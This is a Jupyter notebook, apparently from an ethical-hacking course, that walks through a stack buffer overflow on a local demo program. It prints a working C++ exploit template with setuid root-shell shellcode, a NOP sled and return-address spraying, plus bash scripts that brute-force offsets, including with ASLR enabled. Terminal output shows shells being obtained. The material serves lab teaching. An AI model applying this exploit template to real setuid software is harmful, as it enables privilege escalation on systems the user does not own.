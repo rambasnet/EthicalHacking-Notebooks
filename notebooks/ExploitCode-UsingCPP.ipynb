{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# C++ exploit code\n",
    "\n",
    "- as we've seen that the base address of buffer shifts in memory depending on the size of the program and the argument it takes\n",
    "    - the buffer address we see on GDB is not that same as the program is run outside GDB due to GDB's environment varaibles\n",
    "    - finding the base address of buffer and NOP sled landing target becomes a moving target and thus a challenging one \n",
    "- C/C++ exploits make it easier to guess the buffer address (a.k.a controlled return address) of the NOP sled landing zone\n",
    "- since C/C++ programs make it easier to print the address of any variables, one can create a reference variable on the stack of exploit program\n",
    "    - using the reference variable's address as a point of reference, the target program that's loaded by this program will be on top (lower memory address) with respect to this program\n",
    "    - can try and guess the offset to subtract from the reference variable's address as the return address that lands somewhere in the NOP sled\n",
    "- a sample exploit code in C++ is provided in `demos/stack_overflow/so_arg_exploit.cpp`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cp ./demos/stack_overflow/so_arg.cpp .\n",
    "! cp ./demos/stack_overflow/so_arg_exploit.cpp ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "\n",
    "input=\"./demos/stack_overflow/so_arg.cpp\"\n",
    "output=\"so_arg.exe\"\n",
    "\n",
    "echo kali | sudo -S ./compile.sh $input $output"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffc1e0\n",
      "buffer contains: \n",
      "Hello World\n",
      "Good bye!\n"
     ]
    }
   ],
   "source": [
    "! ./so_arg.exe \"Hello World\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\n",
      "#include <stdlib.h>\n",
      "#include <string.h>\n",
      "#include <iostream>\n",
      "#include <string>\n",
      "\n",
      "using namespace std;\n",
      "\n",
      "/*\n",
      "return address is calculated based-on the exploit code's stack variable address\n",
      "however, need to do a guessing work on finding the right offset to find the target\n",
      "program's caller's return address relative to the buffer\n",
      "\n",
      "Steps:\n",
      "find the payload size needed to overwrite the return address\n",
      "    - buffer's address is automatically calculated\n",
      "creat payload: [NOP sled | shellcode | repeated return address]\n",
      "launch target program with the payload: system(\"./targetProgram payload\")\n",
      "*/\n",
      "   \n",
      "string shellcode = \n",
      "     // root shell; that escalates the priviledge for exploiting setuid program\n",
      "     \"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\"\n",
      "     \"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\"\n",
      "     \"\\xe1\\xcd\\x80\";\n",
      "     \n",
      "     // regular shell\n",
      "     /*\n",
      "     \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\"\n",
      "     \"\\xc9\\x89\\xca\\x6a\\x0b\\x58\\xcd\\x80\";\n",
      "     */\n",
      "\n",
      "int main(int argc, char *argv[]) {\n",
      "    // address of ref_var is used as the point of reference to determine offset\n",
      "    size_t ref_var, ret_address, offset;\n",
      "    size_t payload_len;\n",
      "    char *ptr, *payload;\n",
      "\n",
      "    //=================FIXME\n",
      "    string command = \"./so_arg.exe \\\"\";\n",
      "    //=================\n",
      "    \n",
      "    if(argc == 2) // set offset\n",
      "        offset = atoi(argv[1]);\n",
      "    else\n",
      "        offset = 100; // FIXME, if offset is determined\n",
      "\n",
      "    // create payload\n",
      "    // | NOP sled | shellcode | repeated return address |\n",
      "\n",
      "    //==================FIXME\n",
      "    payload_len = 144; // the actual offset of caller's return address withrespect to buffer\n",
      "    size_t ret_address_count = 5; // you can increase or decrease this based on payload_len\n",
      "    //==================\n",
      "\n",
      "    payload = new char[payload_len];\n",
      "    ptr = payload;\n",
      "\n",
      "    size_t NOP_sled_len = payload_len - shellcode.length() - (4*ret_address_count);\n",
      "    memset(ptr, 0x90, NOP_sled_len); // build NOP sled\n",
      "    ptr += NOP_sled_len;\n",
      "\n",
      "    // copy shellcode\n",
      "    memcpy(ptr, shellcode.c_str(), shellcode.length());\n",
      "    ptr += shellcode.length();\n",
      "\n",
      "    ret_address = (unsigned int) &ref_var - offset; // set return address\n",
      "    for(int i=0; i<(ret_address_count*4); i+=4) // fill ptr with return address\n",
      "        *((unsigned int *)(ptr+i)) = ret_address;\n",
      "    //printf(\"ref_var at %p\\n\", &ref_var);\n",
      "    //printf(\"ret add = %p\\n\", ret_address);\n",
      "    command += string(payload) + \"\\\"\";\n",
      "    // cout << command;\n",
      "    system(command.c_str()); // run exploit\n",
      "    delete [] payload;\n",
      "}\n",
      "\n"
     ]
    }
   ],
   "source": [
    "! cat ./demos/stack_overflow/so_arg_exploit.cpp"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- just need to update couple of variables with this exploit template\n",
    "    1. targer program name\n",
    "    2. the payload_len (offset) of the target program's return address\n",
    "    \n",
    "- we already know the offset is **144** for so_arg.exe from the previous demonstration\n",
    "- use peda's pattern create and search technique as described in Stack Overflow Remote Code execution notebook and others\n",
    "- the exploit automatically finds the return address based on the exploit program's ref_variable on it's stack and the provided argument as the offset\n",
    "    - however, one has to still guess the offset (the value that needs to be subtracted from the adddress of ref_variable to find the address of NOP sled on the target program's stack\n",
    "- the exploit creates the payload in the form:\n",
    "\n",
    "```\n",
    "| NOP sled | shellcode | repeated return address |\n",
    "```\n",
    "- compile the exploit program"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "input=\"demos/stack_overflow/so_arg_exploit.cpp\"\n",
    "output=\"so_arg_exploit.exe\"\n",
    "g++ -m32 $input -o $output"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- prgram provides default offset, if you're lucky this may work and you don't have to provide guessed offset as an argument\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking]\n",
    "└─$ ./so_arg_exploit.exe           \n",
    "buffer is at 0xffffc2d0\n",
    "buffer contains: \n",
    "�����������������������������������������������������������������������������������������1�1�1ə��j\n",
    "                                                                                                  XQh//shh/bin��Q��S�� ��� ��� ��� ��� ���\n",
    "$ whoami\n",
    "kali\n",
    "$ date\n",
    "Thu Dec 17 12:49:38 MST 2020\n",
    "$ exit\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Providing offset via argument\n",
    "- the C++ exploit code is written in such a way that it accepts some offset as an argument\n",
    "- this allows us to script and continuously guess the right offset to generate the right return address that lands somewhere on the NOP sled\n",
    "- a demo script to automate this process is provided in `demos/stack_overflow/so_arg_cpp_exploit.sh`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cp ./demos/stack_overflow/so_arg_cpp_exploit.sh ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#!/bin/bash\n",
      "\n",
      "for i in $(seq 100 4 120)\n",
      "do\n",
      "    echo Trying offset $i\n",
      "    ./so_arg_exploit.exe $i\n",
      "done\n"
     ]
    }
   ],
   "source": [
    "! cat so_arg_cpp_exploit.sh"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- the bash script runs the target program so_arg_exploit.exe several times; each time with offset ranging from 100 to 120 with a step of 4\n",
    "\n",
    "- now run the Bash script that repeatedly runs the exploit program with various offset as an argument\n",
    "- if you don't get a shell withing this offset range, you can widen it to stop at bigger offset, can also cange the step from 4 to 1 to try every number in between\n",
    "- we get the root shell when trying with **offset 100** and others as shown following\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking]\n",
    "└─$ bash so_arg_cpp_exploit.sh   \n",
    "Trying offset 100\n",
    "buffer is at 0xffffc2e0\n",
    "buffer contains: \n",
    "�����������������������������������������������������������������������������������������1�1�1ə��j\n",
    "                                                                                                  XQh//shh/bin��Q��S��0���0���0���0���0���\n",
    "$ whoami\n",
    "kali\n",
    "$ date\n",
    "Thu Dec 17 12:59:06 MST 2020\n",
    "$ exit\n",
    "Trying offset 104\n",
    "buffer is at 0xffffc2e0\n",
    "buffer contains: \n",
    "�����������������������������������������������������������������������������������������1�1�1ə��j\n",
    "                                                                                                  XQh//shh/bin��Q��S��,���,���,���,���,���\n",
    "$ exit\n",
    "Trying offset 108\n",
    "buffer is at 0xffffc2e0\n",
    "buffer contains: \n",
    "�����������������������������������������������������������������������������������������1�1�1ə��j\n",
    "                                                                                                  XQh//shh/bin��Q��S��(���(���(���(���(���\n",
    "$ \n",
    "\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Turning on ASLR\n",
    "\n",
    "- if ASLR is turned ON, the buffer address keeps changing and becomes a moving target\n",
    "- we can, however, write a script to try a wide range of offset and see if we get lucky!\n",
    "- let's turn the ASLR ON and use CPP exploit to guess the address of the buffer enemurating a wide range of offsets...\n",
    "- one needs patients as it may take several minutes; I got shell 3 times!!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S bash -c 'echo 2 > /proc/sys/kernel/randomize_va_space'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2\r\n"
     ]
    }
   ],
   "source": [
    "! cat /proc/sys/kernel/randomize_va_space"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffcb55d0\r\n",
      "buffer contains: \r\n",
      "hello\r\n",
      "Good bye!\r\n"
     ]
    }
   ],
   "source": [
    "! ./so_arg.exe \"hello\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffd7cad0\r\n",
      "buffer contains: \r\n",
      "hello\r\n",
      "Good bye!\r\n"
     ]
    }
   ],
   "source": [
    "! ./so_arg.exe \"hello\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cp ./demos/stack_overflow/so_arg_cpp_exploit_aslr_on.sh ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#!/bin/bash\r\n",
      "\r\n",
      "for i in $(seq 1000000 4 11266432)\r\n",
      "do\r\n",
      "    echo Trying offset $i\r\n",
      "    ./so_arg_exploit.exe $i\r\n",
      "done\r\n"
     ]
    }
   ],
   "source": [
    "! cat so_arg_cpp_exploit_aslr_on.sh"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- run the above script from a terminal and see if you're lucky!\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/projects/SystemSecurity]\n",
    "└─$ bash so_arg_cpp_exploit_no_aslr.sh  \n",
    "\n",
    "Segmentation fault\n",
    "Trying offset 1217304\n",
    "buffer is at 0xff9e4450\n",
    "buffer contains: \n",
    "�����������������������������������������������������������������������������������������1�1�1ə��j\n",
    "                                                                                                  XQh//shh/bin��Q��S��,ҙ�,ҙ�,ҙ�,ҙ�,ҙ�\n",
    "Segmentation fault\n",
    "Trying offset 1217308\n",
    "buffer is at 0xffb04e20\n",
    "buffer contains: \n",
    "�����������������������������������������������������������������������������������������1�1�1ə��j\n",
    "                                                                                                  XQh//shh/bin��Q��S���/���/���/���/���/��\n",
    "Segmentation fault\n",
    "Trying offset 1217312\n",
    "buffer is at 0xffdb57f0\n",
    "buffer contains: \n",
    "�����������������������������������������������������������������������������������������1�1�1ə��j\n",
    "                                                                                                  XQh//shh/bin��Q��S��t=��t=��t=��t=��t=��\n",
    "Segmentation fault\n",
    "Trying offset 1217316\n",
    "sh: 1: Syntax error: EOF in backquote substitution\n",
    "Trying offset 1217320\n",
    "buffer is at 0xfff1b980\n",
    "buffer contains: \n",
    "�����������������������������������������������������������������������������������������1�1�1ə��j\n",
    "                                                                                                  XQh//shh/bin��Q��S������������\n",
    "Segmentation fault\n",
    "Trying offset 1217324\n",
    "buffer is at 0xffe3af50\n",
    "buffer contains: \n",
    "�����������������������������������������������������������������������������������������1�1�1ə��j\n",
    "                                                                                                  XQh//shh/bin��Q��S������������\n",
    "!!!!!! GOT LUCKY!!!!!                                                                                           \n",
    "$ whoami\n",
    "kali\n",
    "$ date\n",
    "Sun Apr  3 22:50:11 MDT 2022\n",
    "$ \n",
    "\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Challenge\n",
    "\n",
    "1. Modify the above `demos/stack_overflow/so_arg_exploit.cpp` C++ exploit code to get a root shell (instead of the regular shell)\n",
    "    - test to make sure the exploit code works\n",
    "    \n",
    "\n",
    "2. Write exploit code for `demos/stack_overflow/so_stdio.cpp` demo program\n",
    "    - exploit gives user shell\n",
    "    - test to make sure the exploit code works\n",
    "    \n",
    "    \n",
    "3. Write exploit code for s`demos/tack_overflow/so_stdio.cpp` demo program\n",
    "    - exploit gives root shell\n",
    "    - test to make sure the exploit code works"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
